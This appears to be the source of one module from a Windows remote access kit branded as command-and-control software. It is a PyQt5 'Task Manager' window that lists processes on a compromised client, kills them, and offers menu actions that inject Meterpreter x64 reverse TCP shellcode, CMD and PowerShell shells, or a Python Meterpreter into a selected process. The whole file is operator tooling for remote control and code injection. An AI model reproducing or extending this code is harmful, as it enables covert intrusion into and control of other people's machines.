#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.23
# -------------------------------------------------------------
from PyQt5 import QtCore, QtWidgets
from PyQt5.Qt import Qt
from PyQt5.QtWidgets import QWidget,QMenu
from PyQt5.QtCore import QEvent

from core.utils.file_paths import DSFilePath,BGPath
from core.logging.logging import LoggingUtilitys,ConsoleWindow
from core.Qt5.icons import IconObj

from core.client_handling.enumeration import SystemCommands
from core.client_handling.system import SystemManager
from core.client_handling.shell import Meterpreter,SystemShell
from core.client_handling.meterpreter_payloads import MSFPayload

import os

class Ui_task_manager_dialog(QWidget):

    def __init__(self):
        super(Ui_task_manager_dialog, self).__init__()
        """
        Start menu init. Create Menu Object.
        """
        self.context_menu = QMenu(self)  # Create Menu Object
        """
        Add submenus the main menu/other menus
        """
        self.injector_menu = self.context_menu.addMenu('Injector')
        self.shellcode_menu = self.injector_menu.addMenu('Shellcode')
        self.python_menu = self.injector_menu.addMenu('Python')
        self.meterpreter_menu = self.shellcode_menu.addMenu('Meterpreter')
        """
        Add actions to to the menu/sub menus
        """
        self.refresh_task_list = self.context_menu.addAction('Refresh Tasks')
        self.kill_process = self.context_menu.addAction('Kill Process')
        self.x64_reverse_tcp = self.meterpreter_menu.addAction('x64/Reverse TCP')
        self.cmd_shell = self.python_menu.addAction('CMD Shell')
        self.ps_shell = self.python_menu.addAction('PowerShell')
        self.python_meterpreter_shell = self.python_menu.addAction('Meterpreter')
        """
        Set the icons for each action on the context menu
        """
        self.refresh_task_list.setIcon(IconObj().sync_icon)
        self.kill_process.setIcon(IconObj().kill_task_icon)
        self.injector_menu.setIcon(IconObj().injector_icon)
        self.meterpreter_menu.setIcon(IconObj().msf_icon)
        self.shellcode_menu.setIcon(IconObj().shellcode_icon)
        self.python_menu.setIcon(IconObj().python_icon)
        self.cmd_shell.setIcon(IconObj().cmd_shell_icon)
        self.ps_shell.setIcon(IconObj().ps_shell_icon)
        self.python_meterpreter_shell.setIcon(IconObj().python_icon)
        """
        End menu init.
        """

    #Function will refresh the UI with current tasks from the system
    def refresh_tasks(self):
        SystemCommands().extract_running_process(self.encryption_key,self.client_socket_obj)    #Tell the client to send of the current running tasks
        while True:                                                                             #Start loop
            if os.path.exists(DSFilePath().task_manager_file):                                  #If the task manager data from the client has arrived,
                break                                                                           #Break the loop
        self.task_table_widget.setRowCount(0)                                                   #Clear the table widget
        self.populate_task_list()                                                               #Populate the task list

    #Function will instruct the agent to kill a task by pid
    def kill_task(self):
        task_row = self.task_table_widget.currentRow()                  #Get the current row from the click
        process_pid = self.task_table_widget.item(task_row,1).text()    #Get the text from column containing the pid
        SystemManager().kill_client_process(str(process_pid),self.encryption_key,self.client_socket_obj) #Instruct client to kill process
        while True:                                                     #Start loop
            if os.path.exists(DSFilePath().job_file):                   #When the job file exists,
                os.remove(DSFilePath().job_file)                        #Remove the file
                break                                                   #Break the loop
        self.refresh_tasks()                                            #Refresh the task list

    #Function will populate the gui with process information received from the client
    def populate_task_list(self):
        client_task_data = LoggingUtilitys().retrieve_file_data(
            DSFilePath().task_manager_file)  # Retrieve data written to file from socket
        row_count = 0       #Set row and column counts to 0
        column_count = 0
        self.task_table_widget.setRowCount(len(client_task_data.split('\n'))) #Define length of table by the string split by new lines. Each line reps a process
        for data in client_task_data.split('<sep>'):                        #For each piece of data
            data_cell = QtWidgets.QTableWidgetItem(data.replace('\n',''))  # Populate item object with data
            data_cell.setTextAlignment(Qt.AlignLeft)                        # Set text alignment
            data_cell.setFlags(Qt.ItemIsEnabled | Qt.ItemIsSelectable)      # Make sure item can't be edited but can be selected
            data_cell.setBackground(Qt.transparent)                         # Set background to transparent
            self.task_table_widget.setItem(row_count, column_count, data_cell)  # Add item to the table widget
            column_count += 1                                               # Increase column count
        os.remove(DSFilePath().task_manager_file)                           # Remove task manager file as data is no longer needed

    def eventFilter(self, source, event):
        if event.type() == QEvent.ContextMenu and source is self.task_table_widget:

            """
            Define the action of clicking on the menu/make the menu appear where the cursor was clicked
            """
            action = self.context_menu.exec_(self.mapToGlobal(event.globalPos()))  # Define the click action bool for the menu
            """
            Assign functions to the menu items when they are clicked 
            """
            if action == self.refresh_task_list:                                       #If the action is to refresh the tasks
                self.refresh_tasks()                                          #Refresh the window with current tasks

            if action == self.kill_process:                                        #If the action is to kill a process
                self.kill_task()                                              #Kill the task

            if action == self.x64_reverse_tcp:                                     #if the action is to inject msf shellcode
                ConsoleWindow().log_to_console(f'Generating meterpreter shellcode, please standby!')   #Log to console
                process_pid = self.task_table_widget.item(self.task_table_widget.currentRow(),1).text() #Get process pid
                Meterpreter().inject_msf_payload(                                                       #Prepare and inject payload
                    MSFPayload().staged_x64_reverse_tcp,
                    process_pid,
                    self.encryption_key,
                    self.client_socket_obj)

            if action == self.cmd_shell:                                          #If the action is to inject a python cmd shell
                proc_name = self.task_table_widget.item(self.task_table_widget.currentRow(),0).text()   #Get the process name
                SystemShell().inject_exec_CMD(self.client_socket_obj,             #Inject the code
                                              self.encryption_key,
                                              proc_name)

            if action == self.ps_shell:                                           #If the action is to inject a python powershell shell
                proc_name = self.task_table_widget.item(self.task_table_widget.currentRow(), 0).text() #Get the process name
                SystemShell().inject_exec_PS(self.client_socket_obj,                #Inject the code
                                              self.encryption_key,
                                              proc_name)

            if action == self.python_meterpreter_shell:                             #If the action is to inject a python powershell shell
                proc_name = self.task_table_widget.item(self.task_table_widget.currentRow(), 0).text()  #Get the process name
                Meterpreter().inject_exec_py_meter(self.client_socket_obj,           #Inject the code
                                                   self.encryption_key,
                                                   proc_name)

            return True
        return super().eventFilter(source, event)

    def setupUi(self, task_manager_dialog,client_socket_obj,encryption_key):
        """
        Initialize UI parameters
        """
        task_manager_dialog.setObjectName("task_manager_dialog")
        task_manager_dialog.resize(680, 704)
        task_manager_dialog.setWindowIcon(IconObj().task_manager_icon)
        """
        Make encryption key and client socket obj accessible throughout the class
        so we can communicate with the agent that is presenting us the process's
        """
        self.client_socket_obj = client_socket_obj
        self.encryption_key = encryption_key
        """
        Create object, set geometry, stylesheet and name
        """
        self.task_table_widget = QtWidgets.QTableWidget(task_manager_dialog)
        self.task_table_widget.setGeometry(QtCore.QRect(20, 30, 640, 581))
        self.task_table_widget.setStyleSheet(f"background-image: url({BGPath().task_man_bg});")
        self.task_table_widget.setObjectName("task_table_widget")
        """
        Handle table widget settings
        """
        self.task_table_widget.setColumnCount(3)
        self.task_table_widget.setRowCount(0)
        item = QtWidgets.QTableWidgetItem()
        self.task_table_widget.setHorizontalHeaderItem(0, item)
        self.task_table_widget.setColumnWidth(0, 290)
        item = QtWidgets.QTableWidgetItem()
        self.task_table_widget.setHorizontalHeaderItem(1, item)
        self.task_table_widget.setColumnWidth(1, 100)
        item = QtWidgets.QTableWidgetItem()
        self.task_table_widget.setHorizontalHeaderItem(2, item)
        self.task_table_widget.setColumnWidth(2, 200)
        """
        Set configurations for the table widget which will display all of our
        running process's on the client
        """
        self.task_table_widget.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectionBehavior.SelectRows)
        self.task_table_widget.horizontalHeader().setVisible(True)
        self.task_table_widget.horizontalHeader().setCascadingSectionResizes(False)
        self.task_table_widget.horizontalHeader().setHighlightSections(False)
        self.task_table_widget.horizontalHeader().setSortIndicatorShown(False)
        self.task_table_widget.horizontalHeader().setStretchLastSection(True)
        self.task_table_widget.verticalHeader().setCascadingSectionResizes(False)
        self.task_table_widget.verticalHeader().setSortIndicatorShown(False)
        self.task_table_widget.verticalHeader().setStretchLastSection(False)
        self.task_table_widget.verticalHeader().setVisible(False)
        """
        Finish setting up the UI and populate the table widget with our process data from the client
        """
        self.task_table_widget.installEventFilter(self)
        self.retranslateUi(task_manager_dialog)
        self.populate_task_list()
        QtCore.QMetaObject.connectSlotsByName(task_manager_dialog)

    def retranslateUi(self, task_manager_dialog):
        _translate = QtCore.QCoreApplication.translate
        task_manager_dialog.setWindowTitle(_translate("task_manager_dialog", "Task Manager"))
        item = self.task_table_widget.horizontalHeaderItem(0)
        item.setText(_translate("task_manager_dialog", "Process Name"))
        item = self.task_table_widget.horizontalHeaderItem(1)
        item.setText(_translate("task_manager_dialog", "PID"))
        item = self.task_table_widget.horizontalHeaderItem(2)
        item.setText(_translate("task_manager_dialog", "User"))
